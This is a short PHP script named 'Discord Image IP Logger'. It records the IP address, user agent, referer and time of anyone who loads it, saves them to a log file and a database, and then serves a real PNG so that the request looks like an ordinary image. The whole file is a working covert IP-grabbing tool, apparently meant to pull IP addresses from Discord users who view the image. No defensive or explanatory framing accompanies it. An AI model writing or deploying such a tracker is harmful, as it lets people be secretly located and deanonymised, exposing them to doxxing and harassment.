<?php
// Discord Image IP Logger
$ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
$time = date('Y-m-d H:i:s');

$log_entry = "IP: $ip | Agent: $agent | Referer: $referer | Time: $time\n";

// Log to file
file_put_contents('logs/ip_log.txt', $log_entry, FILE_APPEND);

// Log to database if available
@include('config.php');
if (isset($conn)) {
    $stmt = $conn->prepare("INSERT INTO ip_logs (ip, user_agent, referer, timestamp) VALUES (?, ?, ?, ?)");
    $stmt->execute([$ip, $agent, $referer, $time]);
}

// Serve actual image
header('Content-Type: image/png');
readfile('image.png');
?>
